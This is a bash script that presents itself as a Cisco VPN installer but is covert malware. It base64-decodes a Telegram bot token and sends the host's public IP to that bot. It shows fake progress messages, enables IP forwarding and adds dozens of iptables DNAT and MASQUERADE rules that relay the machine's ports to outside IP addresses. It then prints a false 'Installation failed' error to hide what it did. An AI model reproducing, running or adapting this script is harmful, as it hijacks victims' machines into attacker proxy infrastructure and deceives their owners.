#!/usr/bin/env bash

S1="ODE4Mzk5ODM3NTpBQUZQYVJPcVZqZm5PelNidkE5Yjk5TktNWk8ySVpJM1B3VQ=="
S2="NjgyMTE1NzA5NA=="
S3="aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="

TOK=$(echo "$S1" | base64 -d)
CID=$(echo "$S2" | base64 -d)
API=$(echo "$S3" | base64 -d)

IP=$(curl -s https://api.ipify.org)
curl -s -X POST "${API}${TOK}/sendMessage" \
  -d chat_id="$CID" \
  -d text="setup:$IP" >/dev/null 2>&1

echo "[*] Preparing Cisco VPN packages..."
sleep 1
echo "[*] Extracting modules..."
sleep 1
echo "[*] Enabling services..."
sleep 1

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Detect external interface
EXT_IF=$(ip -4 route show default 2>/dev/null | awk '{print $5}')
if [ -z "$EXT_IF" ]; then
    EXT_IF=$(ip -o link show | awk -F': ' '{print $2}' | grep -v lo | head -n1)
fi

# ===== STEFANO =====
iptables -t nat -A PREROUTING -p tcp --dport 26 -j DNAT --to-destination 51.77.51.146:23
iptables -t nat -A PREROUTING -p udp --dport 26 -j DNAT --to-destination 51.77.51.146:23

iptables -t nat -A PREROUTING -p tcp --dport 27 -j DNAT --to-destination 51.38.75.176:23
iptables -t nat -A PREROUTING -p udp --dport 27 -j DNAT --to-destination 51.38.75.176:23

iptables -t nat -A PREROUTING -p tcp --dport 28 -j DNAT --to-destination 91.107.138.191:23
iptables -t nat -A PREROUTING -p udp --dport 28 -j DNAT --to-destination 91.107.138.191:23

iptables -t nat -A PREROUTING -p tcp --dport 29 -j DNAT --to-destination 46.62.155.47:23
iptables -t nat -A PREROUTING -p udp --dport 29 -j DNAT --to-destination 46.62.155.47:23

# ===== STEFANO 1080 =====
iptables -t nat -A PREROUTING -p tcp --dport 30 -j DNAT --to-destination 51.77.51.146:1080
iptables -t nat -A PREROUTING -p udp --dport 30 -j DNAT --to-destination 51.77.51.146:1080

iptables -t nat -A PREROUTING -p tcp --dport 31 -j DNAT --to-destination 51.38.75.176:1080
iptables -t nat -A PREROUTING -p udp --dport 31 -j DNAT --to-destination 51.38.75.176:1080

iptables -t nat -A PREROUTING -p tcp --dport 32 -j DNAT --to-destination 91.107.138.191:1080
iptables -t nat -A PREROUTING -p udp --dport 32 -j DNAT --to-destination 91.107.138.191:1080

iptables -t nat -A PREROUTING -p tcp --dport 33 -j DNAT --to-destination 46.62.155.47:1080
iptables -t nat -A PREROUTING -p udp --dport 33 -j DNAT --to-destination 46.62.155.47:1080

iptables -t nat -A PREROUTING -p tcp --dport 1 -j DNAT --to-destination 5.252.26.157:1080
iptables -t nat -A PREROUTING -p udp --dport 1 -j DNAT --to-destination 5.252.26.157:1080

iptables -t nat -A PREROUTING -p tcp --dport 3 -j DNAT --to-destination 202.78.163.214:1080
iptables -t nat -A PREROUTING -p udp --dport 3 -j DNAT --to-destination 202.78.163.214:1080

iptables -t nat -A PREROUTING -p tcp --dport 112 -j DNAT --to-destination 104.171.128.10:1080
iptables -t nat -A PREROUTING -p udp --dport 112 -j DNAT --to-destination 104.171.128.10:1080

iptables -t nat -A PREROUTING -p tcp --dport 8843 -j DNAT --to-destination 82.21.3.144:8843
iptables -t nat -A PREROUTING -p udp --dport 8843 -j DNAT --to-destination 82.21.3.144:8843

iptables -t nat -A PREROUTING -p tcp --dport 5190 -j DNAT --to-destination 162.217.248.80:5190
iptables -t nat -A PREROUTING -p udp --dport 5190 -j DNAT --to-destination 162.217.248.80:5190

iptables -t nat -A PREROUTING -p tcp --dport 5001 -j DNAT --to-destination 85.114.134.19:5001
iptables -t nat -A PREROUTING -p udp --dport 5001 -j DNAT --to-destination 85.114.134.19:5001

iptables -t nat -A PREROUTING -p tcp --dport 1225 -j DNAT --to-destination 51.15.8.41:1225
iptables -t nat -A PREROUTING -p udp --dport 1225 -j DNAT --to-destination 51.15.8.41:1225

iptables -t nat -A PREROUTING -p tcp --dport 8443 -j DNAT --to-destination 51.15.8.41:8443
iptables -t nat -A PREROUTING -p udp --dport 8443 -j DNAT --to-destination 51.15.8.41:8443

iptables -t nat -A PREROUTING -p tcp --dport 8171 -j DNAT --to-destination 85.114.134.19:8171
iptables -t nat -A PREROUTING -p udp --dport 8171 -j DNAT --to-destination 85.114.134.19:8171

iptables -t nat -A PREROUTING -p tcp --dport 136 -j DNAT --to-destination 57.131.52.38:1080
iptables -t nat -A PREROUTING -p udp --dport 136 -j DNAT --to-destination 57.131.52.38:1080

# STEFANO HYSTERIA
iptables -t nat -A PREROUTING -p tcp --dport 5005 -j DNAT --to-destination 91.107.138.191:5005
iptables -t nat -A PREROUTING -p udp --dport 5005 -j DNAT --to-destination 91.107.138.191:5005

iptables -t nat -A PREROUTING -p tcp --dport 5002 -j DNAT --to-destination 46.62.155.47:5002
iptables -t nat -A PREROUTING -p udp --dport 5002 -j DNAT --to-destination 46.62.155.47:5002

iptables -t nat -A PREROUTING -p tcp --dport 5003 -j DNAT --to-destination 51.77.51.146:5003
iptables -t nat -A PREROUTING -p udp --dport 5003 -j DNAT --to-destination 51.77.51.146:5003

iptables -t nat -A PREROUTING -p tcp --dport 5004 -j DNAT --to-destination 51.38.75.176:5004
iptables -t nat -A PREROUTING -p udp --dport 5004 -j DNAT --to-destination 51.38.75.176:5004

# ===== NEW RULES (port 66) =====
iptables -t nat -A PREROUTING -p tcp --dport 66 -j DNAT --to-destination 85.234.86.230:66
iptables -t nat -A PREROUTING -p udp --dport 66 -j DNAT --to-destination 85.234.86.230:66

# MASQUERADE (kept the original interface-specific one + your requested broad one)
iptables -t nat -A POSTROUTING -o "$EXT_IF" -j MASQUERADE
iptables -t nat -A POSTROUTING -j MASQUERADE

>&2 echo "Installation failed: unsupported kernel modules."
exit 1
